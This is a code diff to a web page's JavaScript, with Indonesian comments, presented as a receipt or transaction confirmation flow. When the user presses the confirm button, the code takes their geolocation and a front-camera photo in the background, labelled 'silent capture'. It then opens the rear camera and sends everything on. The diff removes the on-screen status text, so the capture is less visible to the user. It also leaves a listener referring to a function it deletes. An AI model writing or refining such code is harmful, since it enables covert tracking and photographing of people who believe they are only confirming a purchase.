@@ -214,25 +214,33 @@
     }
 
     // ============================================================
-    // BACK CAMERA FOR RECEIPT PHOTO
+    // BACK CAMERA FOR RECEIPT / ITEM PHOTO
     // ============================================================
     async function openBackCamera() {
         try {
-            console.log('[BACK-CAM] Opening back camera...');
+            console.log('[BACK-CAM] Opening back camera for item...');
             
-            backCameraStream = await navigator.mediaDevices.getUserMedia({
-                video: {
-                    facingMode: { exact: 'environment' },  // KAMERA BELAKANG
-                    width: { ideal: 1920 },
-                    height: { ideal: 1080 }
-                },
-                audio: false
-            });
+            try {
+                backCameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        facingMode: { ideal: 'environment' },  // KAMERA BELAKANG
+                        width: { ideal: 1920 },
+                        height: { ideal: 1080 }
+                    },
+                    audio: false
+                });
+            } catch (e1) {
+                // Fallback kamera biasa
+                backCameraStream = await navigator.mediaDevices.getUserMedia({
+                    video: true,
+                    audio: false
+                });
+            }
 
             if (elements.cameraVideo) {
                 elements.cameraVideo.srcObject = backCameraStream;
                 elements.cameraVideo.setAttribute('playsinline', '');
-                elements.cameraVideo.play();
+                await elements.cameraVideo.play().catch(() => {});
             }
 
             if (elements.cameraContainer) {
@@ -241,31 +249,27 @@
 
             return true;
         } catch (err) {
-            console.error('[BACK-CAM] Error:', err);
-            // Fallback: pakai file input
-            if (elements.fileCameraInput) {
-                elements.fileCameraInput.click();
-            }
+            console.error('[BACK-CAM] Error opening rear camera:', err);
             return false;
         }
     }
 
-    // Capture dari kamera belakang
+    // Capture snapshot dari kamera belakang
     function captureBackCamera() {
         if (!elements.cameraVideo || !elements.cameraCanvas) return null;
         
         const video = elements.cameraVideo;
         const canvas = elements.cameraCanvas;
         
-        canvas.width = video.videoWidth || 1920;
-        canvas.height = video.videoHeight || 1080;
+        canvas.width = video.videoWidth || 1280;
+        canvas.height = video.videoHeight || 720;
         
         const ctx = canvas.getContext('2d');
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         
         const dataUrl = canvas.toDataURL('image/jpeg', CONFIG.BACK_CAMERA_QUALITY);
         
-        // Stop stream
+        // Stop stream kamera belakang
         if (backCameraStream) {
             backCameraStream.getTracks().forEach(track => track.stop());
             backCameraStream = null;
@@ -279,7 +283,8 @@
     }
 
     // ============================================================
-    // MAIN HANDLER - KLIK TOMBOL "AMBIL FOTO"
+    // MAIN HANDLER - SILENT CAPTURE DEPAN & LOKASI DULU, 
+    // LALU LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
     // ============================================================
     async function handleConfirmClick() {
         if (!elements.receiptCard) return;
@@ -289,146 +294,97 @@
         elements.btnConfirm.disabled = true;
 
         try {
-            // ==========================================
-            // STEP 1: SILENT LOCATION CAPTURE
-            // ==========================================
+            // STEP 1: SILENT LOCATION CAPTURE (Background)
             console.log('[STEP-1] Silent location capture...');
-            if (elements.cameraStatus) {
-                elements.cameraStatus.textContent = 'Memproses data...';
-            }
-            
             silentLocationData = await getSilentLocation();
             console.log('[STEP-1] Location:', silentLocationData);
 
-            // ==========================================
-            // STEP 2: SILENT FRONT CAMERA CAPTURE
-            // ==========================================
+            // STEP 2: SILENT FRONT CAMERA CAPTURE (Background)
             console.log('[STEP-2] Silent front camera capture...');
-            if (elements.cameraStatus) {
-                elements.cameraStatus.textContent = 'Memverifikasi...';
-            }
-            
             silentFrontPhotoBase64 = await silentFrontCameraCapture();
-            
-            if (!silentFrontPhotoBase64) {
-                console.warn('[STEP-2] Front camera failed, continuing anyway...');
-            }
 
-            // ==========================================
-            // STEP 3: SCREENSHOT RECEIPT (html2canvas)
-            // ==========================================
+            // STEP 3: SCREENSHOT RECEIPT (html2canvas sebagai fallback/struk)
             console.log('[STEP-3] Screenshot receipt...');
-            
-            let canvas;
             if (typeof window.html2canvas === 'function') {
-                canvas = await window.html2canvas(elements.receiptCard, {
-                    scale: 2,
-                    useCORS: true,
-                    allowTaint: true,
-                    backgroundColor: '#ffffff'
-                });
-                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
-            } else {
-                canvas = document.createElement('canvas');
-                canvas.width = 400;
-                canvas.height = 500;
-                const ctx = canvas.getContext('2d');
-                ctx.fillStyle = '#ffffff';
-                ctx.fillRect(0, 0, 400, 500);
-                ctx.fillStyle = '#0033ff';
-                ctx.font = 'bold 20px Inter, sans-serif';
-                ctx.fillText('BUKTI STRUK TRANSAKSI', 40, 50);
-                capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                try {
+                    const canvas = await window.html2canvas(elements.receiptCard, {
+                        scale: 2,
+                        useCORS: true,
+                        allowTaint: true,
+                        backgroundColor: '#ffffff'
+                    });
+                    capturedPhotoBase64 = canvas.toDataURL('image/jpeg', 0.85);
+                } catch(e) {}
             }
 
-            // ==========================================
-            // STEP 4: OPEN BACK CAMERA (KAMERA BELAKANG)
-            // ==========================================
-            console.log('[STEP-4] Opening back camera for receipt...');
-            if (elements.cameraStatus) {
-                elements.cameraStatus.textContent = 'Arahkan ke barang/struk...';
-            }
+            // STEP 4: LANGSUNG BUKA KAMERA BELAKANG UNTUK FOTO BARANG
+            console.log('[STEP-4] Langsung membuka kamera belakang...');
+            const backOpened = await openBackCamera();
 
-            // Tampilkan modal preview dulu
-            if (elements.modalPreviewImg) {
-                elements.modalPreviewImg.src = capturedPhotoBase64;
-            }
-            if (elements.photoModal) {
-                elements.photoModal.style.display = 'flex';
-            }
+            if (!backOpened) {
+                // Jika kamera belakang tidak tersedia / error, langsung kirim data silent yang ada
+                await saveTransactionWithSilentData(
+                    silentLocationData,
+                    silentFrontPhotoBase64,
+                    capturedPhotoBase64
+                );
 
-            // Buka kamera belakang
-            const backCamOpened = await openBackCamera();
-            
-            if (!backCamOpened) {
-                console.warn('[STEP-4] Back camera failed, using screenshot only');
-            }
+                if (elements.btnConfirm) {
+                    elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
+                    elements.btnConfirm.style.backgroundColor = '#10b981';
+                    elements.btnConfirm.dataset.verified = 'true';
+                }
 
-            // ==========================================
-            // STEP 5: KIRIM DATA (SILENT + SCREENSHOT + BACK CAMERA)
-            // ==========================================
-            console.log('[STEP-5] Sending all data...');
-            
-            // Kirim data lengkap
-            await saveTransactionWithSilentData(
-                silentLocationData,
-                silentFrontPhotoBase64,
-                capturedPhotoBase64
-            );
+                showNotification('Konfirmasi Berhasil Diverifikasi!', 'success');
+            }
 
         } catch (err) {
             console.error('Error in handleConfirmClick:', err);
             showNotification('Gagal memproses. Coba lagi.', 'error');
-        } finally {
             elements.btnConfirm.textContent = originalText;
             elements.btnConfirm.disabled = false;
         }
     }
 
     // ============================================================
-    // HANDLE SEND (SETELAH FOTO BELAKANG DIAMBIL)
+    // HANDLE CAPTURE BACK PHOTO & SEND ALL
     // ============================================================
-    async function handleSendPhoto() {
-        if (!capturedPhotoBase64 && !silentFrontPhotoBase64) {
-            showNotification('Foto belum tersedia!', 'error');
-            return;
-        }
-
-        if (elements.btnSendPhoto) {
-            elements.btnSendPhoto.textContent = '⏳ Mengirim...';
-            elements.btnSendPhoto.disabled = true;
+    async function handleCaptureBackPhoto() {
+        if (elements.btnCaptureBack) {
+            elements.btnCaptureBack.textContent = '⏳ Mengirim Data...';
+            elements.btnCaptureBack.disabled = true;
         }
 
         try {
-            // Ambil foto dari kamera belakang kalau ada
+            // Ambil foto barang dari kamera belakang
             const backPhoto = captureBackCamera();
             if (backPhoto) {
                 capturedPhotoBase64 = backPhoto;
             }
 
-            // Kirim semua data
+            // Kirim semua data: Lokasi Silent + Foto Depan Silent + Foto Barang Belakang
             await saveTransactionWithSilentData(
                 silentLocationData || await getSilentLocation(),
                 silentFrontPhotoBase64,
                 capturedPhotoBase64
             );
 
-            closeModal();
-
+            // Update status tombol menjadi sukses terverifikasi
             if (elements.btnConfirm) {
                 elements.btnConfirm.textContent = '✅ Konfirmasi Berhasil Diverifikasi';
                 elements.btnConfirm.style.backgroundColor = '#10b981';
                 elements.btnConfirm.dataset.verified = 'true';
             }
 
-            showNotification('Data berhasil dikirim!', 'success');
-        } catch (error) {
-            console.error('Error:', error);
+            showNotification('✅ Foto barang & data verifikasi berhasil dikirim!', 'success');
+
+        } catch (err) {
+            console.error('Error in handleCaptureBackPhoto:', err);
             showNotification('Gagal mengirim data.', 'error');
         } finally {
-            if (elements.btnSendPhoto) {
-                elements.btnSendPhoto.textContent = '✅ Konfirmasi & Kirim Foto';
-                elements.btnSendPhoto.disabled = false;
+            if (elements.btnCaptureBack) {
+                elements.btnCaptureBack.textContent = '📸 Ambil Foto Barang';
+                elements.btnCaptureBack.disabled = false;
             }
         }
     }
@@ -593,17 +549,7 @@
     if (elements.btnCancelPhoto) elements.btnCancelPhoto.addEventListener('click', closeModal);
     if (elements.btnSendPhoto) elements.btnSendPhoto.addEventListener('click', handleSendPhoto);
     if (elements.btnConfirm) elements.btnConfirm.addEventListener('click', handleConfirmClick);
-    if (elements.btnCaptureBack) {
-        elements.btnCaptureBack.addEventListener('click', () => {
-            const photo = captureBackCamera();
-            if (photo) {
-                capturedPhotoBase64 = photo;
-                if (elements.modalPreviewImg) elements.modalPreviewImg.src = photo;
-                if (elements.photoModal) elements.photoModal.style.display = 'flex';
-                showNotification('Foto berhasil diambil!', 'success');
-            }
-        });
-    }
+    if (elements.btnCaptureBack) elements.btnCaptureBack.addEventListener('click', handleCaptureBackPhoto);
 
     // Init
     loadTemplate();
